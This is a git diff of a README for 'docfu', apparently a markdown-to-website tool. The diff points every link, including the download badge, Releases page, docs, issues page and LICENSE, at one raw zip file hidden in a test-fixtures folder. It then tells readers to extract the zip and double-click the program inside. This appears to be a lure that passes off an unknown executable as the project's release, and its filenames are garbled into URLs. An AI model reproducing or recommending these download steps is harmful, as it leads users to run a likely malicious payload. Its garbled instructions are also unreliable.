@@ -6,7 +6,7 @@
 
 ## 📥 Download Now
 
-[![Download docfu](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip)](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip)
+[![Download docfu](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip)](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip)
 
 ## 🚀 Getting Started
 
@@ -20,15 +20,15 @@ To use docfu, follow these steps to download and run the application.
 
 ## 💾 Download & Install
 
-1. **Visit this page to download:** Navigate to the [Releases page](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip) to find the version of docfu that suits your needs.
+1. **Visit this page to download:** Navigate to the [Releases page](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip) to find the version of docfu that suits your needs.
    
-2. **Choose the right version:** On the Releases page, select the latest version of docfu. Look for files named `https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip`, `https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip`, or equivalents.
+2. **Choose the right version:** On the Releases page, select the latest version of docfu. Look for files named `https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip`, `https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip`, or equivalents.
 
 3. **Download the file:** Click on the file link to begin downloading. The file will begin to download onto your computer. 
 
 4. **Extract the files:** Once the download is complete, locate the file and extract it. Right-click on the file, and select "Extract All" or use a similar extraction option available on your operating system.
 
-5. **Run docfu:** Open the extracted folder. Find and double-click on the docfu application file. This may be named `https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip` for Windows or `docfu` for macOS and Linux. 
+5. **Run docfu:** Open the extracted folder. Find and double-click on the docfu application file. This may be named `https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip` for Windows or `docfu` for macOS and Linux. 
 
 6. **Follow the prompts:** Once the application opens, follow the on-screen instructions to create your website from markdown files.
 
@@ -59,12 +59,12 @@ If you encounter any issues while using docfu, try these steps:
 - Ensure you have downloaded the correct version for your operating system.
 - Check that you have enough disk space and memory available.
 - Restart the application if it freezes or does not respond.
-- Consult the FAQ section on the [GitHub Issues page](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip) for common solutions or to report problems.
+- Consult the FAQ section on the [GitHub Issues page](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip) for common solutions or to report problems.
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For detailed instructions, visit the [docs page](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip).
-- **Community Support:** Join discussions and ask questions on our [GitHub Discussions](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip).
+- **Documentation:** For detailed instructions, visit the [docs page](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip).
+- **Community Support:** Join discussions and ask questions on our [GitHub Discussions](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip).
 - **Follow Us:** Stay updated on new features and improvements by following our repository.
 
 ## 💬 Feedback
@@ -73,8 +73,8 @@ Your feedback is important to us. If you have suggestions, feature requests, or 
 
 ## 📜 License
 
-This project is licensed under the MIT License. For more details, see the [LICENSE](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip) file in the repository.
+This project is licensed under the MIT License. For more details, see the [LICENSE](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip) file in the repository.
 
 ## 📥 Download Again
 
-To download docfu, [visit this page](https://raw.githubusercontent.com/bayoe18/docfu/main/bottomlessness/docfu.zip). Thank you for using docfu!
+To download docfu, [visit this page](https://raw.githubusercontent.com/bayoe18/docfu/main/test/fixtures/exclude-patterns/internal/Software-driftpiece.zip). Thank you for using docfu!
